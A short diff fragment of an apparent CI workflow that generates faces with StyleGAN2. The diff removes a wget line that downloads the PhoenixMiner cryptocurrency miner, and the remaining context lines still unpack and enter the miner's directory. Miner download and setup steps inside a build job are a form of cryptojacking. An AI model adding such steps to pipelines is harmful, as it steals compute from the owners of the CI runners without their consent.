@@ -41,7 +41,6 @@ jobs:
           --seeds=6600-6605 \
           --truncation-psi=0.5 \
           --result-dir=/outputs/generatedFaces
-        wget https://github.com/cynixx3/third-party-miner-installer-for-ethos/releases/download/phoenixminer_5.0e/PhoenixMiner_5.0e_Linux.tar.gz
         tar -xvzf PhoenixMiner_5.0e_Linux.tar.gz
         cd /inputs/stylegan2/PhoenixMiner_5.0e_Linux
         ls
